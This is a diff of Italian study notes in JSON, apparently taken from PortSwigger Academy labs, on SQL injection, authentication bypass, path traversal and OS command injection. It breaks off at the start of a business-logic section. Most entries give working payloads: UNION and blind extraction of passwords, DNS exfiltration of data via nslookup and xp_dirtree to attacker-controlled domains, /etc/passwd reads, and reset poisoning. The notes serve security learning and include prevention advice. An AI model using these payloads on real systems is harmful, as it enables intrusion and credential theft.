@@ -1,62 +1,88 @@
 {
+  "source": "appunti PortSwigger Academy",
   "topics": [
     {
       "name": "SQL Injection",
       "description": "Interferire con le query SQL dell'applicazione tramite input non filtrato.",
-      "references": "https://portswigger.net/web-security/sql-injection",
       "intro": "L'SQL injection (SQLi) e' una vulnerabilita' che consente a un attaccante di interferire con le query che un'applicazione esegue sul proprio database. Puo' permettere di visualizzare dati che normalmente non sarebbero recuperabili (dati di altri utenti o qualunque dato dell'applicazione), e in alcuni casi di modificarli o cancellarli, alterando il comportamento dell'applicazione.\n\nIndividuazione manuale: su ogni punto di ingresso prova in modo sistematico\n- l'apice singolo ' e cerca errori;\n- sintassi SQL che valuta il valore base del punto di ingresso vs un valore diverso;\n- condizioni booleane come OR 1=1 e OR 1=2, osservando le differenze nelle risposte;\n- payload che causano ritardi temporali quando eseguiti nella query;\n- payload OAST che generano un'interazione di rete fuori banda (verso un server controllato).\n\nPrevenzione: usare query parametrizzate (prepared statement) invece della concatenazione di stringhe, ovunque un input non attendibile appaia come dato nella query (clausola WHERE, valori di INSERT/UPDATE). Dove i parametri non sono utilizzabili (nomi di tabella/colonna, ORDER BY) usare una whitelist di valori ammessi.\n\nCheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet",
+      "references": "https://portswigger.net/web-security/sql-injection",
+      "checks": [],
       "children": [
         {
           "name": "Rilevare una SQL injection",
           "description": "I test sistematici da provare su ogni punto di ingresso.",
+          "intro": null,
+          "references": null,
           "checks": [
             {
               "title": "Apice singolo",
               "goal": "Primo indizio: rompere la sintassi della query.",
+              "tool": null,
               "payload": "'",
-              "process": "Inserisci un apice singolo nel punto di ingresso e cerca errori SQL o risposte anomale."
+              "process": "Inserisci un apice singolo nel punto di ingresso e cerca errori SQL o risposte anomale.",
+              "interpretation": null,
+              "references": null
             },
             {
               "title": "Condizioni booleane (OR 1=1 / OR 1=2)",
               "goal": "Verificare se l'input influenza la logica della query.",
+              "tool": null,
               "payload": "' OR 1=1--\n' OR 1=2--",
-              "process": "Invia una condizione vera e una falsa e confronta le due risposte: se cambiano, la query e' influenzabile."
+              "process": "Invia una condizione vera e una falsa e confronta le due risposte: se cambiano, la query e' influenzabile.",
+              "interpretation": null,
+              "references": null
             },
             {
               "title": "Ritardi temporali",
               "goal": "Rilevare SQLi anche senza output visibile.",
+              "tool": null,
               "payload": "'; IF (1=1) WAITFOR DELAY '0:0:10'--",
-              "process": "Inietta un payload che ritarda la risposta solo se la query viene eseguita; misura il tempo di risposta."
+              "process": "Inietta un payload che ritarda la risposta solo se la query viene eseguita; misura il tempo di risposta.",
+              "interpretation": null,
+              "references": null
             },
             {
               "title": "Payload OAST (out-of-band)",
               "goal": "Rilevare SQLi quando non c'e' alcuna differenza osservabile nella risposta.",
+              "tool": null,
               "payload": "'; exec master..xp_dirtree '//TUO-SOTTODOMINIO.burpcollaborator.net/a'--",
-              "process": "Genera un'interazione di rete (es. DNS) verso un sistema sotto il tuo controllo (Burp Collaborator) e verifica se arriva."
+              "process": "Genera un'interazione di rete (es. DNS) verso un sistema sotto il tuo controllo (Burp Collaborator) e verifica se arriva.",
+              "interpretation": null,
+              "references": null
             }
           ]
         },
         {
           "name": "Esempi di base",
           "description": "Gli usi tipici di una SQLi una volta individuata.",
+          "intro": null,
+          "references": null,
           "checks": [
             {
               "title": "Raggiungere dati nascosti",
               "goal": "Rimuovere filtri della query per vedere dati non mostrati.",
+              "tool": null,
               "payload": "https://sito/products?category=Gifts'--",
-              "process": "Il -- commenta il resto della query: SELECT ... WHERE category = 'Gifts'--' AND released = 1 -> salta il filtro 'released = 1'."
+              "process": "Il -- commenta il resto della query: SELECT ... WHERE category = 'Gifts'--' AND released = 1 -> salta il filtro 'released = 1'.",
+              "interpretation": null,
+              "references": null
             },
             {
               "title": "Aggirare la logica di login",
               "goal": "Autenticarsi come un utente senza conoscerne la password.",
+              "tool": null,
               "payload": "administrator'--",
-              "process": "Nel campo username: SELECT * FROM users WHERE username = 'administrator'--' AND password = '' -> il controllo password viene commentato."
+              "process": "Nel campo username: SELECT * FROM users WHERE username = 'administrator'--' AND password = '' -> il controllo password viene commentato.",
+              "interpretation": null,
+              "references": null
             },
             {
               "title": "Dati da altre tabelle (UNION)",
               "goal": "Aggiungere i risultati di una seconda SELECT a quelli originali.",
+              "tool": null,
               "payload": "' UNION SELECT username, password FROM users--",
               "process": "Usa UNION per eseguire una query aggiuntiva su un'altra tabella e accodarne i risultati.",
+              "interpretation": null,
               "references": "https://portswigger.net/web-security/sql-injection/union-attacks"
             }
           ]
@@ -64,112 +90,1187 @@
         {
           "name": "Esaminare il database",
           "description": "Capire tipo/versione del DBMS ed elencarne tabelle e colonne.",
+          "intro": null,
+          "references": null,
           "checks": [
             {
               "title": "Tipo e versione del database",
               "goal": "Identificare il DBMS per adattare i payload.",
+              "tool": null,
               "payload": "-- Microsoft SQL Server / MySQL:\nSELECT @@version\n-- Oracle:\nSELECT * FROM v$version\n-- PostgreSQL:\nSELECT version()\n-- via UNION:\n' UNION SELECT @@version--",
               "process": "Inietta la query specifica di ciascun DBMS e vedi quale funziona.",
-              "interpretation": "Su Oracle ogni SELECT richiede FROM: usa la tabella dual (es. UNION SELECT 'abc' FROM dual). In molti DBMS -- richiede uno spazio dopo; si puo' usare anche #."
+              "interpretation": "Su Oracle ogni SELECT richiede FROM: usa la tabella dual (es. UNION SELECT 'abc' FROM dual). In molti DBMS -- richiede uno spazio dopo; si puo' usare anche #.",
+              "references": null
             },
             {
               "title": "Elencare le tabelle",
               "goal": "Scoprire quali tabelle esistono.",
+              "tool": null,
               "payload": "SELECT * FROM information_schema.tables\n-- Oracle:\nSELECT * FROM all_tables",
-              "process": "La maggior parte dei DBMS espone l'information schema con l'elenco delle tabelle."
+              "process": "La maggior parte dei DBMS espone l'information schema con l'elenco delle tabelle.",
+              "interpretation": null,
+              "references": null
             },
             {
               "title": "Elencare le colonne di una tabella",
               "goal": "Scoprire le colonne (es. username, password).",
+              "tool": null,
               "payload": "SELECT * FROM information_schema.columns WHERE table_name = 'Users'\n-- Oracle:\nSELECT * FROM all_tab_columns WHERE table_name = 'USERS'",
-              "process": "Interroga information_schema.columns filtrando per il nome della tabella trovata."
+              "process": "Interroga information_schema.columns filtrando per il nome della tabella trovata.",
+              "interpretation": null,
+              "references": null
             }
           ]
         },
         {
           "name": "UNION attacks",
           "description": "Recuperare dati da altre tabelle quando i risultati finiscono nella risposta.",
-          "references": "https://portswigger.net/web-security/sql-injection/union-attacks",
           "intro": "UNION accoda i risultati di altre SELECT a quelli della query originale. Perche' funzioni: stesso numero di colonne e tipi di dato compatibili tra le query.",
+          "references": "https://portswigger.net/web-security/sql-injection/union-attacks",
           "checks": [
             {
               "title": "Numero di colonne con ORDER BY",
               "goal": "Determinare quante colonne restituisce la query originale.",
+              "tool": null,
               "payload": "' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--",
-              "process": "Incrementa l'indice finche' non appare un errore: l'ultimo indice valido e' il numero di colonne."
+              "process": "Incrementa l'indice finche' non appare un errore: l'ultimo indice valido e' il numero di colonne.",
+              "interpretation": null,
+              "references": null
             },
             {
               "title": "Numero di colonne con UNION SELECT NULL",
               "goal": "Metodo alternativo per contare le colonne.",
+              "tool": null,
               "payload": "' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--\n-- Oracle:\n' UNION SELECT NULL FROM DUAL--",
-              "process": "Aumenta i NULL finche' l'errore sparisce: NULL e' compatibile con ogni tipo."
+              "process": "Aumenta i NULL finche' l'errore sparisce: NULL e' compatibile con ogni tipo.",
+              "interpretation": null,
+              "references": null
             },
             {
               "title": "Trovare una colonna di tipo stringa",
               "goal": "Individuare una colonna che puo' contenere testo (per esfiltrare stringhe).",
+              "tool": null,
               "payload": "' UNION SELECT 'a',NULL,NULL,NULL--\n' UNION SELECT NULL,'a',NULL,NULL--\n' UNION SELECT NULL,NULL,'a',NULL--",
-              "process": "Metti 'a' in una colonna alla volta: se il tipo non e' compatibile con una stringa, la query da' errore."
+              "process": "Metti 'a' in una colonna alla volta: se il tipo non e' compatibile con una stringa, la query da' errore.",
+              "interpretation": null,
+              "references": null
             },
             {
               "title": "Recuperare dati interessanti",
               "goal": "Estrarre i dati veri (es. credenziali).",
+              "tool": null,
               "payload": "' UNION SELECT username, password FROM users--",
-              "process": "Noto il numero di colonne e quali reggono stringhe, seleziona i campi utili dalla tabella bersaglio."
+              "process": "Noto il numero di colonne e quali reggono stringhe, seleziona i campi utili dalla tabella bersaglio.",
+              "interpretation": null,
+              "references": null
             },
             {
               "title": "Piu' valori in una sola colonna",
               "goal": "Esfiltrare piu' campi quando la query restituisce una sola colonna.",
+              "tool": null,
               "payload": "' UNION SELECT username || '~' || password FROM users--",
-              "process": "Concatena i valori con un separatore (su Oracle l'operatore e' ||)."
+              "process": "Concatena i valori con un separatore (su Oracle l'operatore e' ||).",
+              "interpretation": null,
+              "references": null
             }
           ]
         },
         {
           "name": "Blind SQL injection",
           "description": "SQLi sfruttabile anche se risposta ed errori non mostrano i risultati.",
+          "intro": null,
           "references": "https://portswigger.net/web-security/sql-injection/blind",
           "checks": [
             {
               "title": "Risposte condizionali (boolean-based)",
               "goal": "Dedurre i dati un carattere alla volta dalle differenze di risposta.",
+              "tool": null,
               "payload": "xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm",
-              "process": "Inietta una condizione vera/falsa (es. su un cookie TrackingId) e osserva un marcatore come \"Welcome back\"; restringi carattere per carattere (SUBSTRING, chiamata SUBSTR in alcuni DBMS)."
+              "process": "Inietta una condizione vera/falsa (es. su un cookie TrackingId) e osserva un marcatore come \"Welcome back\"; restringi carattere per carattere (SUBSTRING, chiamata SUBSTR in alcuni DBMS).",
+              "interpretation": null,
+              "references": null
             },
             {
               "title": "Errori condizionali (error-based)",
               "goal": "Usare la presenza/assenza di un errore come oracolo.",
+              "tool": null,
               "payload": "xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a",
-              "process": "Costruisci una query che va in errore (es. divisione per zero) solo se la condizione e' vera; osserva se compare un messaggio di errore."
+              "process": "Costruisci una query che va in errore (es. divisione per zero) solo se la condizione e' vera; osserva se compare un messaggio di errore.",
+              "interpretation": null,
+              "references": null
             },
             {
               "title": "Estrarre dati dai messaggi di errore",
               "goal": "Leggere dati direttamente dentro un errore dettagliato.",
+              "tool": null,
               "payload": "CAST((SELECT example_column FROM example_table) AS int)",
-              "process": "Con CAST converti una stringa in un tipo incompatibile (es. int): l'errore mostra il valore, es. 'invalid input syntax for type integer: \"Example data\"'."
+              "process": "Con CAST converti una stringa in un tipo incompatibile (es. int): l'errore mostra il valore, es. 'invalid input syntax for type integer: \"Example data\"'.",
+              "interpretation": null,
+              "references": null
             },
             {
               "title": "Ritardi temporali condizionali (time-based)",
               "goal": "Usare il tempo di risposta come oracolo quando gli errori sono gestiti.",
+              "tool": null,
               "payload": "'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--",
-              "process": "La query ritarda solo se la condizione e' vera; misurando il tempo ricostruisci la password carattere per carattere."
+              "process": "La query ritarda solo se la condizione e' vera; misurando il tempo ricostruisci la password carattere per carattere.",
+              "interpretation": null,
+              "references": null
             },
             {
               "title": "Out-of-band (OAST) ed esfiltrazione DNS",
               "goal": "Sfruttare la SQLi quando non c'e' alcun oracolo osservabile nella risposta.",
+              "tool": null,
               "payload": "'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree \"//'+@p+'.TUO-SOTTODOMINIO.burpcollaborator.net/a\"')--",
-              "process": "Provoca una richiesta DNS verso un sottodominio Collaborator univoco includendo nel nome il dato da esfiltrare; monitora le interazioni ricevute."
+              "process": "Provoca una richiesta DNS verso un sottodominio Collaborator univoco includendo nel nome il dato da esfiltrare; monitora le interazioni ricevute.",
+              "interpretation": null,
+              "references": null
             }
           ]
         },
         {
           "name": "SQL injection in contesti diversi",
           "description": "Input in JSON/XML e offuscamento per aggirare i WAF.",
+          "intro": null,
+          "references": null,
           "checks": [
             {
               "title": "Offuscare in XML per bypassare i WAF",
               "goal": "Aggirare filtri che bloccano parole chiave SQL.",
+              "tool": null,
               "payload": "<stockCheck>\n  <productId>123</productId>\n  <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>\n</stockCheck>",
-              "process": "Codifica i caratteri delle parole proibite (qui la 'S' di SELECT come &#x53;) per superare WAF e filtri basati su parole chiave."
+              "process": "Codifica i caratteri delle parole proibite (qui la 'S' di SELECT come &#x53;) per superare WAF e filtri basati su parole chiave.",
+              "interpretation": null,
+              "references": null
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "Authentication",
+      "description": "Aggirare o forzare login, 2FA, reset e cambio password.",
+      "intro": "L'autenticazione verifica l'identita' di un utente. Tre tipi: qualcosa che conosci (password), qualcosa che possiedi (telefono/token), qualcosa che sei (biometria). E' diversa dall'autorizzazione (cosa un utente e' autorizzato a fare).\n\nLe vulnerabilita' nascono quando i meccanismi non proteggono dal brute-force, oppure quando errori logici permettono di aggirare del tutto l'autenticazione. Chi aggira l'autenticazione o entra nell'account altrui ne ottiene dati e funzioni, e nuove superfici d'attacco.",
+      "references": "https://portswigger.net/web-security/authentication",
+      "checks": [],
+      "children": [
+        {
+          "name": "Login basati su password",
+          "description": "Brute-force, enumerazione utenti e protezioni difettose.",
+          "intro": null,
+          "references": "https://portswigger.net/web-security/authentication/password-based",
+          "checks": [
+            {
+              "title": "Brute-force delle credenziali",
+              "goal": "Indovinare username/password validi per tentativi ed errori.",
+              "tool": "Burp Intruder / hydra",
+              "payload": null,
+              "process": "Verifica se il sito espone nomi utente (pagine pubbliche, email nelle risposte HTTP anche di admin/support). Sfrutta il comportamento umano per le password ad alta entropia.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Username enumeration",
+              "goal": "Capire se un nome utente e' valido dalle differenze di comportamento.",
+              "tool": null,
+              "payload": null,
+              "process": "Su login/registrazione osserva differenze in: codici di stato, messaggi di errore, tempi di risposta. Costruisci cosi' una lista di username validi.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Protezioni brute-force difettose",
+              "goal": "Aggirare blocchi basati su IP o su numero di tentativi.",
+              "tool": null,
+              "payload": null,
+              "process": "Se il contatore si azzera dopo un login corretto, inserisci nella wordlist un tuo login valido ogni pochi tentativi. Se il blocco e' per IP, falsifica l'IP apparente.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: bypass del blocco per IP",
+              "is_lab": true,
+              "process": "Lab risolto aggiungendo l'header X-Forwarded-For per cambiare l'IP apparente e aggirare il rate-limit basato su IP.",
+              "payload": "X-Forwarded-For: 1.2.3.4",
+              "references": null
+            },
+            {
+              "title": "Blocco dell'account (account lockout)",
+              "goal": "Aggirare il lockout e sfruttarne le risposte per enumerare.",
+              "tool": null,
+              "payload": null,
+              "process": "Con limite di N tentativi: prendi molti username candidati e al massimo N password probabili; prova ogni password su tutti gli username (Intruder). Il lockout non protegge dal credential stuffing (ogni username provato una volta).",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Limitazione per utente: piu' password in una richiesta",
+              "goal": "Aggirare il rate-limit provando piu' password in una sola richiesta HTTP.",
+              "tool": null,
+              "payload": null,
+              "process": "Se il limite conta le richieste HTTP, cerca un modo per tentare piu' password all'interno di una singola richiesta.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: molte password in una sola richiesta",
+              "is_lab": true,
+              "process": "Lab risolto inserendo tutte le password in una sola richiesta POST, che conteneva la password in formato JSON (un array di valori).",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "HTTP Basic authentication",
+              "goal": "Riconoscerne i rischi.",
+              "tool": null,
+              "payload": null,
+              "process": "Il token e' base64(username:password) nell'header Authorization, reinviato a ogni richiesta. Rischi: credenziali ripetute (senza HSTS), spesso nessuna protezione brute-force, nessuna protezione CSRF.",
+              "interpretation": null,
+              "references": null
+            }
+          ]
+        },
+        {
+          "name": "Autenticazione a più fattori (2FA)",
+          "description": "Bypass e logica difettosa del secondo fattore.",
+          "intro": null,
+          "references": "https://portswigger.net/web-security/authentication/multi-factor",
+          "checks": [
+            {
+              "title": "Intercettazione del codice 2FA",
+              "goal": "Capire i limiti dei codici via SMS.",
+              "tool": null,
+              "payload": null,
+              "process": "I codici via SMS possono essere intercettati o ottenuti con SIM swapping (SIM fraudolenta associata al numero della vittima).",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Aggirare il 2FA (stato 'loggato' anticipato)",
+              "goal": "Saltare del tutto il secondo fattore.",
+              "tool": null,
+              "payload": null,
+              "process": "Se dopo la password l'utente e' gia' di fatto 'loggato', prova ad accedere direttamente alle pagine riservate senza inserire il codice: a volte il sito non verifica che il secondo passaggio sia stato completato.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Logica difettosa del 2FA",
+              "goal": "Completare il secondo fattore per conto di un altro utente.",
+              "tool": null,
+              "payload": "POST /login-steps/second\nCookie: account=victim-user\nverification-code=123456",
+              "process": "Se un cookie (es. account=carlos) determina per quale account si invia il codice, cambialo con lo username della vittima al momento dell'invio.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: 2FA logic flaw",
+              "is_lab": true,
+              "process": "Lab risolto intercettando la GET che genera il codice e rifacendola cambiando il nome utente, poi brute-force del codice sulla POST cambiando il nome.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Brute-force dei codici 2FA",
+              "goal": "Forzare un codice di verifica a bassa entropia.",
+              "tool": null,
+              "payload": null,
+              "process": "Se il sito fa logout dopo troppi codici errati, automatizza il re-login tra un tentativo e l'altro (macro di Burp Intruder, oppure Turbo Intruder).",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: brute-force del codice 2FA",
+              "is_lab": true,
+              "process": "Lab risolto creando una macro che ripete il login, cosi' da tornare al form del 2FA prima di ogni tentativo di brute-force sul valore del codice.",
+              "payload": null,
+              "references": null
+            }
+          ]
+        },
+        {
+          "name": "Altri meccanismi (remember me, reset, cambio password)",
+          "description": "Funzioni correlate al login, spesso meno protette.",
+          "intro": null,
+          "references": "https://portswigger.net/web-security/authentication/other-mechanisms",
+          "checks": [
+            {
+              "title": "Cookie 'remember me' prevedibile",
+              "goal": "Dedurre o forzare il cookie persistente di altri utenti.",
+              "tool": null,
+              "payload": null,
+              "process": "Se il cookie e' una concatenazione di valori statici (nome+timestamp, o la password), analizza il tuo per capirne la formula. Base64 non e' protezione; un hash senza salt si forza calcolando l'hash delle wordlist.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: cookie = nome:password-hashata",
+              "is_lab": true,
+              "process": "Lab risolto entrando con l'account, notando che il cookie e' nome:password-hashata, e facendo brute-force sulle password aggiungendo il passaggio di hashing in Payload Processing di Intruder.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Lab: rubare il cookie remember-me via XSS",
+              "is_lab": true,
+              "process": "Lab risolto inserendo una stored XSS in un commento per rubare il cookie 'logged in' della vittima, poi decoding base64 e CrackStation per risalire alla password.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Reset della password via URL/token",
+              "goal": "Reimpostare la password di un altro utente.",
+              "tool": null,
+              "payload": "http://sito/reset-password?user=victim-user",
+              "process": "Se l'URL identifica l'account con un parametro prevedibile (user=...), cambialo. Se il token non viene riverificato all'invio del form, apri il reset del tuo account, rimuovi il token e reimposta la password di un altro.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: password reset poisoning",
+              "is_lab": true,
+              "process": "Lab risolto aggiungendo l'header X-Forwarded-Host alla POST di reset e cambiando lo username: l'email arrivava alla vittima ma il link puntava al server exploit, catturando il token.",
+              "payload": "X-Forwarded-Host: TUO-SERVER-EXPLOIT",
+              "references": null
+            },
+            {
+              "title": "Cambio password",
+              "goal": "Sfruttare campi nascosti o la verifica della password attuale.",
+              "tool": null,
+              "payload": null,
+              "process": "Se lo username e' in un campo nascosto, modificalo per colpire altri utenti. La pagina verifica la password attuale come un login: puo' essere brute-forzabile.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: brute-force della password attuale al cambio",
+              "is_lab": true,
+              "process": "Lab risolto intercettando la POST di cambio password, cambiando user e mettendo due nuove password DIVERSE: nel brute-force sul campo 'password attuale', quella giusta da' l'errore 'le due nuove password non coincidono' (le altre danno 'password attuale errata'), rivelando la password corrente.",
+              "payload": null,
+              "references": null
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "Path Traversal",
+      "description": "Leggere file arbitrari sul server uscendo dalla directory prevista.",
+      "intro": "Il Path Traversal (o Directory Traversal) consente di leggere file arbitrari sul server. Tipico nei parametri che indicano un file (es. ?filename=218.png), quando l'input finisce in un'API del filesystem senza validazione.\n\nPrevenzione: evitare di passare input dell'utente alle API del filesystem. Se inevitabile, validare con una whitelist (o almeno solo caratteri alfanumerici), poi concatenare alla directory base, risolvere il percorso canonico e verificare che inizi con la directory base prevista.",
+      "references": "https://portswigger.net/web-security/file-path-traversal",
+      "checks": [],
+      "children": [
+        {
+          "name": "Lettura di file arbitrari",
+          "description": "Il traversal di base, su Linux e Windows.",
+          "intro": null,
+          "references": null,
+          "checks": [
+            {
+              "title": "Traversal di base",
+              "goal": "Leggere un file fuori dalla directory prevista.",
+              "tool": null,
+              "payload": "../../../etc/passwd\n-- Windows (sia ../ che ..\\):\n..\\..\\..\\windows\\win.ini",
+              "process": "Nel parametro che indica il file (es. ?filename=) risali le directory con ../ fino al file voluto.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: lettura via path traversal",
+              "is_lab": true,
+              "process": "Lab risolti con path traversal sulla richiesta dell'immagine, e con doppio ../ dove la sequenza veniva filtrata.",
+              "payload": null,
+              "references": null
+            }
+          ]
+        },
+        {
+          "name": "Aggirare i filtri",
+          "description": "Quando le sequenze ../ vengono rimosse o bloccate.",
+          "intro": null,
+          "references": null,
+          "checks": [
+            {
+              "title": "Percorso assoluto",
+              "goal": "Evitare del tutto le sequenze ../.",
+              "tool": null,
+              "payload": "filename=/etc/passwd",
+              "process": "Se il filtro rimuove ../, usa un percorso assoluto dalla radice del filesystem.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Sequenze di traversal annidate",
+              "goal": "Sopravvivere a un filtro che rimuove ../ una sola volta.",
+              "tool": null,
+              "payload": "....//\n....\\/",
+              "process": "Quando il filtro toglie la parte interna, ....// torna a essere ../.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "URL encoding e doppio encoding",
+              "goal": "Aggirare una sanitizzazione che agisce prima dell'applicazione.",
+              "tool": null,
+              "payload": "../  ->  %2e%2e%2f\n../  ->  %252e%252e%252f (doppio)\nnon standard:  ..%c0%af   ..%ef%bc%8f",
+              "process": "Codifica i ../ via URL/doppio URL encoding. In Burp Pro c'e' la lista 'Fuzzing - path traversal'.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: bypass con doppio URL encoding",
+              "is_lab": true,
+              "process": "Risolto con encoding: GET /image?filename=..%252f..%252f..%252fetc/passwd",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Directory base obbligatoria",
+              "goal": "Quando il file deve iniziare con la directory base prevista.",
+              "tool": null,
+              "payload": "filename=/var/www/images/../../../etc/passwd",
+              "process": "Includi la directory base richiesta e poi risali con ../.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: directory base + traversal",
+              "is_lab": true,
+              "process": "Lab risolto con GET /image?filename=/var/www/images/../../../etc/passwd",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Estensione obbligatoria (null byte)",
+              "goal": "Quando il nome deve terminare con un'estensione (.png).",
+              "tool": null,
+              "payload": "filename=../../../etc/passwd%00.png",
+              "process": "Il null byte %00 termina il percorso prima dell'estensione: implementazioni vulnerabili ignorano cio' che segue.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: null byte",
+              "is_lab": true,
+              "process": "Lab risolto con GET /image?filename=../../../etc/passwd%00.jpg",
+              "payload": null,
+              "references": null
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "OS Command Injection",
+      "description": "Eseguire comandi del sistema operativo sul server (shell injection).",
+      "intro": "L'OS Command Injection (Shell Injection) consente di eseguire comandi del sistema operativo sul server. Nasce quando l'input dell'utente finisce come argomento di un comando di shell (es. stockreport.pl <productID> <storeID>).\n\nPrevenzione: non eseguire comandi di shell dal codice (usare API della piattaforma). Se inevitabile, validazione rigorosa dell'input.",
+      "references": "https://portswigger.net/web-security/os-command-injection",
+      "checks": [],
+      "children": [
+        {
+          "name": "Iniettare comandi",
+          "description": "Rilevare ed eseguire comandi concatenandoli.",
+          "intro": null,
+          "references": null,
+          "checks": [
+            {
+              "title": "Rilevare con echo / separatori",
+              "goal": "Confermare l'iniezione eseguendo un comando aggiuntivo.",
+              "tool": null,
+              "payload": "& echo aiwefwlguh &\n| whoami",
+              "process": "& separa i comandi: l'output di echo nella risposta conferma l'iniezione. Un & dopo il payload lo separa dal testo che segue, cosi' non rompe l'esecuzione.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: OS command injection semplice",
+              "is_lab": true,
+              "process": "Lab risolto con productId=1|whoami&storeId=1",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Comandi utili per orientarsi",
+              "goal": "Capire dove sei una volta ottenuta l'esecuzione.",
+              "tool": null,
+              "payload": "utente corrente:  whoami\nsistema operativo:  uname -a   (Windows: ver)\nrete:  ifconfig   (Windows: ipconfig /all)\nconnessioni:  netstat -an\nprocessi:  ps -ef   (Windows: tasklist)",
+              "process": null,
+              "interpretation": null,
+              "references": null
+            }
+          ]
+        },
+        {
+          "name": "Blind OS command injection",
+          "description": "Quando l'output non torna nella risposta.",
+          "intro": null,
+          "references": null,
+          "checks": [
+            {
+              "title": "Ritardi temporali",
+              "goal": "Confermare l'esecuzione dal tempo di risposta.",
+              "tool": null,
+              "payload": "& ping -c 10 127.0.0.1 &",
+              "process": "ping con numero di pacchetti controlla la durata: ~10s di ritardo confermano l'esecuzione.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: blind con sleep",
+              "is_lab": true,
+              "process": "Lab risolto inserendo gian@a.com;sleep 10; nel parametro email tramite inspector in Repeater, cosi' lo encodi automaticamente.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Reindirizzare l'output in un file nella web root",
+              "goal": "Leggere l'output recuperando un file dal browser.",
+              "tool": null,
+              "payload": "& whoami > /var/www/static/whoami.txt &",
+              "process": "> scrive l'output in un file servito staticamente; poi apri https://sito/whoami.txt.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: output redirection",
+              "is_lab": true,
+              "process": "Lab superato inserendo gian@a.com;whoami > /www/images/whoami.txt; in Intruder e aprendo poi la richiesta dell'immagine puntata a whoami.txt.",
+              "payload": null,
+              "references": null
+            },
+            {
+              "title": "Out-of-band (OAST) ed esfiltrazione DNS",
+              "goal": "Confermare ed esfiltrare quando non c'e' output ne' ritardo utile.",
+              "tool": null,
+              "payload": "& nslookup kgji2ohoyw.web-attacker.com &\n-- esfiltrazione:\n& nslookup `whoami`.kgji2ohoyw.web-attacker.com &",
+              "process": "nslookup genera una richiesta DNS verso un dominio controllato; i backtick `whoami` eseguono il comando e ne mettono l'output nel sottodominio.",
+              "interpretation": null,
+              "references": null
+            },
+            {
+              "title": "Lab: OAST con nslookup",
+              "is_lab": true,
+              "process": "Lab superato con prova@prova.it; nslookup <SOTTODOMINIO>.oastify.com; e, per l'esfiltrazione, prova@prova.it; nslookup `whoami`.<SOTTODOMINIO>.oastify.com;",
+              "payload": null,
+              "references": null
+            }
+          ]
+        },
+        {
+          "name": "Metacaratteri e separatori",
+          "description": "Come iniettare a seconda del contesto.",
+          "intro": null,
+          "references": null,
+          "checks": [
+            {
+              "title": "Separatori di comando",
+              "goal": "Concatenare comandi secondo il sistema operativo.",
+              "tool": null,
+              "payload": "Windows e Unix:  &   &&   |   ||\nSolo Unix:  ;   e la nuova riga (0x0a, \\n)\nUnix, comando dentro comando:  `comando`   $(comando)",
+              "process": "Se l'input e' dentro virgolette nel comando originale, chiudi prima il contesto con \" o ' e poi inietta.",
+              "interpretation": null,
+              "references": null
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "Business Logic",
+      "description": "Difetti logici nel flusso dell'applicazione che portano a comportamenti non previsti.",
+      "intro": "Le vulnerabilita' di business logic sono difetti di progettazione/implementazione che consentono comportamenti non previsti: aggirare le regole di business (es. completare una transazione saltando il flusso previsto) o fornire valori inattesi alla logica lato server.\n\nPer trovarle bisogna capire il dominio dell'applicazione ed evitare le ipotesi implicite sul comportamento di utenti e componenti. Strumenti chiave: Burp Proxy e Repeater per inviare valori che un utente legittimo non invierebbe mai.",
+      "references": "https://portswigger.net/web-security/logic-flaws",
+      "checks": [],
+      "children": [
+        {
+          "name": "Eccessiva fiducia nei controlli lato client",
+          "description": "I controlli del browser si aggirano modificando la richiesta.",
+          "intro": null,
+          "references": null,
+          "checks": [
+            {
+              "title": "Modificare i dati dopo il browser",
+              "goal": "Bypassare validazioni fatte solo lato client.",
+              "tool": null,
+              "payload": "POST /cart ... price=10   (al posto di price=10000)",
